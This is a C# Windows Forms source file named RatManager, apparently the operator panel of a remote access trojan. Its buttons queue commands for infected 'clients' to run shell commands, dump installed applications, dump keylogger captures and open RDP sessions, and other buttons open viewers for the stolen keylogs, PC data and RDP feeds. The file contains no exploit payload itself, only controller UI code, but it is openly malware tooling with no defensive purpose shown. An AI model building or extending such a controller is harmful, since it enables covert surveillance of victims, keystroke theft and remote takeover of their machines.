using RatManager.SubPages;
using System.Runtime.InteropServices;

namespace RatManager
{
    public partial class Form1 : Form
    {
        private Communicator communicator;
        public Form1()
        {
            InitializeComponent();
            communicator = new Communicator();
        }

        private async Task RefreshAllClients()
        {
            dataGridView1.DataSource = await communicator.SelectAll();
            dataGridView1.RowTemplate.Resizable = DataGridViewTriState.True;
            dataGridView1.RowTemplate.Height = 50;
            foreach (DataGridViewRow x in dataGridView1.Rows)
            {
                x.MinimumHeight = 50;
            }
        }

        private async void UpdateGrid_Click(object sender, EventArgs e)
        {
            await RefreshAllClients();

        }

        private async void btnSetAllForNoCMDRun_Click(object sender, EventArgs e)
        {
            communicator.SetAllForNoCMDRun();
            await RefreshAllClients();
        }

        private async void btnSetAllForNoConnect_Click(object sender, EventArgs e)
        {
            communicator.SetAllForNoConnect();
            await RefreshAllClients();
        }

        private async void btnSetAllForNoInstalledAplicationDump_Click(object sender, EventArgs e)
        {
            communicator.SetAllForNoApplicationDump();
            await RefreshAllClients();
        }

        private async void btnSetAllForNoKeyLogDump_Click(object sender, EventArgs e)
        {
            communicator.SetAllForNoKeyLogDump();
            await RefreshAllClients();
        }

        private async void btnSetAllForNoRegistered_Click(object sender, EventArgs e)
        {
            communicator.SetAllForNoRegistered();
            await RefreshAllClients();
        }

        private async void btnSetAllForNoUpdate_Click(object sender, EventArgs e)
        {
            communicator.SetAllForNoUpdate();
            await RefreshAllClients();
        }

        private async void btnSetAllForNoRDP_Click(object sender, EventArgs e)
        {
            communicator.SetAllForNoRDP();
            await RefreshAllClients();

        }

        private async void btnSetForCMDRun_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            string clientId = dataGridView1.SelectedRows[0].Cells[0].Value.ToString();
            if (clientId != null)
            {
                communicator.SetForCMDRun(clientId);
            }
            await RefreshAllClients();
        }

        private async void btnSetForConnect_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            string clientId = dataGridView1.SelectedRows[0].Cells[0].Value.ToString();
            if (clientId != null)
            {
                communicator.SetForConnect(clientId);
            }
            await RefreshAllClients();
        }

        private async void btnSetForInstalledAplicationDump_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            string clientId = dataGridView1.SelectedRows[0].Cells[0].Value.ToString();
            if (clientId != null)
            {
                communicator.SetForApplicationDump(clientId);
            }
            await RefreshAllClients();
        }

        private async void btnSetForKeyLogDump_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            string clientId = dataGridView1.SelectedRows[0].Cells[0].Value.ToString();
            if (clientId != null)
            {
                communicator.SetForKeyLogDump(clientId);
            }
            await RefreshAllClients();
        }

        private async void btnSetForRegistered_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            string clientId = dataGridView1.SelectedRows[0].Cells[0].Value.ToString();
            if (clientId != null)
            {
                communicator.SetForRegistered(clientId);
            }
            await RefreshAllClients();
        }

        private async void btnSetForUpdate_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            string clientId = dataGridView1.SelectedRows[0].Cells[0].Value.ToString();
            if (clientId != null)
            {
                communicator.SetForUpdate(clientId);
            }
            await RefreshAllClients();
        }

        private async void btnSetForRDP_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            string clientId = dataGridView1.SelectedRows[0].Cells[0].Value.ToString();
            if (clientId != null)
            {
                communicator.SetForRDP(clientId);
            }
            await RefreshAllClients();
        }

        private void btnDisplayApplicationDump_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            ApplicationDump applicationDump = new ApplicationDump(dataGridView1.SelectedRows[0].Cells[0].Value.ToString());
            applicationDump.Show();
        }

        private void btnDisplayKeyLogDump_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            KeyLogDump keyLogDump = new KeyLogDump(dataGridView1.SelectedRows[0].Cells[0].Value.ToString());
            keyLogDump.Show();
        }

        private void btnDisplayPCData_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            PCData pcdata = new PCData(dataGridView1.SelectedRows[0].Cells[0].Value.ToString());
            pcdata.Show();
        }

        private void btnDisplayRDP_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count < 1)
            {
                MessageBox.Show("Select a client!");
                return;
            }
            RDP pcdata = new RDP(dataGridView1.SelectedRows[0].Cells[0].Value.ToString());
            pcdata.Show();
        }

        private void btnDisplayCMDRun_Click(object sender, EventArgs e)
        {
            CMDRun cMDRun = new CMDRun();
            cMDRun.Show();
        }
    }
}
